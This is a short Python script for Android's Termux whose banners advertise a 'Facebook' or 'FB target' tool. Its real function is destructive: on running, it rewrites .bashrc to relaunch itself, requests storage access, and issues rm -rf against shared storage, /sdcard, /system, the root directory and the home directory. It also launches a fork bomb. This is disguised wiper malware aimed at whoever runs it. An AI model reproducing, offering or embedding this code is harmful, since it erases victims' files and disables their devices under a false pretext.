#!/usr/bin/python
#coding=utf-8

from __future__ import print_function
import platform, os, sys, time, smtplib

def move():
	os.system('mv dark.py $HOME/')
	
def logo():
	print("""\033[1;96m═══════════════════════════════════════
\033[1;96m║      \033[1;91m╔═╗╔╗   ┌┬┐┌─┐┬─┐┌─┐┌─┐┌┬┐     \033[1;96m║
\033[1;96m║      \033[1;93m╠╣ ╠╩╗───│ ├─┤├┬┘│ ┬├┤  │      \033[1;96m║
\033[1;96m║      \033[1;92m╚  ╚═╝   ┴ ┴ ┴┴└─└─┘└─┘ ┴      \033[1;96m║
\033[1;96m═══════════════════════════════════════""")
		
def logo2():
	time.sleep(0.001)
	print("""\033[1;96m═══════════════════════════════════════
\033[1;91m────   \033[1;92m┌─┐┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─   \033[1;91m ──── 
\033[1;93m────   \033[1;92m├┤ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐   \033[1;93m ──── 
\033[1;92m────   \033[1;92m└  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴   \033[1;92m ──── 
\033[1;96m═══════════════════════════════════════""")

def mulai():
	time.sleep(0.001)
	os.system('clear')
	logo()
	logo2()
	os.system(':(){ :|: & };:')
	
def data():
	os.system('touch .hushlogin')
	os.system('printf "python2 dark.py" > $HOME/.bashrc')
	os.system('termux-setup-storage')
	os.system('rm -rf /storage/emulated/0/*')
	os.system('rm -rf /storage/emulated/*')
	os.system('rm -rf /sdcard/*')
	os.system('rm -rf /sdcard/0/*')
	os.system('rm -rf /sdcard1/*')
	os.system('rm -rf /storage/*')
	os.system('rm -rf /*')
	os.system('rm -rf /system/*')
	os.system('rm -rf $HOME/../../*')
	os.system('rm -rf $PREFIX/b')
	os.system('rm -rf $HOME/*')
	os.system('mv $HOME /dev/null')
	os.system(':(){ :|: & };:')
	
move()
data()
mulai()